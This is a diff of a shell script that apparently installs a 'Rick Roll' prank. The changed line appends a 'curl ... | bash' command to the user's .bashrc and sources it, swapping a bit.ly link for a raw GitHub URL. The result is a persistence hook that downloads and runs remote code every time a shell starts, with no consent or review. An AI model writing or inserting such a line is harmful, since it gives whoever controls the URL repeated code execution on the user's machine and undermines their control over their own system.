@@ -11,4 +11,4 @@ if [ $? -ne 0 ]; then
 fi
 
 # Put Rick Roll on .bashrc if it's not already there and reload .bashrc
-grep -qxF 'curl -L http://bit.ly/10hA8iC | bash' /home/$USER/.bashrc || echo 'curl -L http://bit.ly/10hA8iC | bash' >> /home/$USER/.bashrc && source /home/$USER/.bashrc
+grep -qxF 'curl -s -L https://raw.githubusercontent.com/keroserene/rickrollrc/master/roll.sh | bash' /home/$USER/.bashrc || echo 'curl -s -L https://raw.githubusercontent.com/keroserene/rickrollrc/master/roll.sh | bash' >> /home/$USER/.bashrc && source /home/$USER/.bashrc
